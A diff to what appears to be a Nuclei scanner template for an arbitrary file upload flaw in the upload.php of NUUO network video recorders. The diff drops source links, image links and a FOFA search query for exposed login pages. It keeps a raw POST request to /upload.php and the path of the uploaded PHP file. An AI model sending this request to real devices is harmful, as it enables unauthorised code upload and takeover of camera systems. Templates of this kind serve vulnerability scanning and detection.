@@ -3,12 +3,8 @@ info:
   name: NUUO摄像头upload.php存在任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/ol79giy36qbi4v42'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: ol79giy36qbi4v42
-    fofa: title="Network Video Recorder Login"
 http:
 - raw:
   - 'POST /upload.php HTTP/1.1
@@ -39,11 +35,8 @@ http:
 
     ----------ok4o88lom--
 
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730077402630-353c6dd8-982a-4198-80b7-796174df689d.png)
 
-    上传定位:/9pqs9.php
-
-    ![](https://cdn.nlark.com/yuque/0/2024/png/43110909/1730077402869-a8696ad1-3975-4871-9722-008c2600bcaa.png)'
+    上传定位:/9pqs9.php'
   redirects: false
   matchers:
   - status:
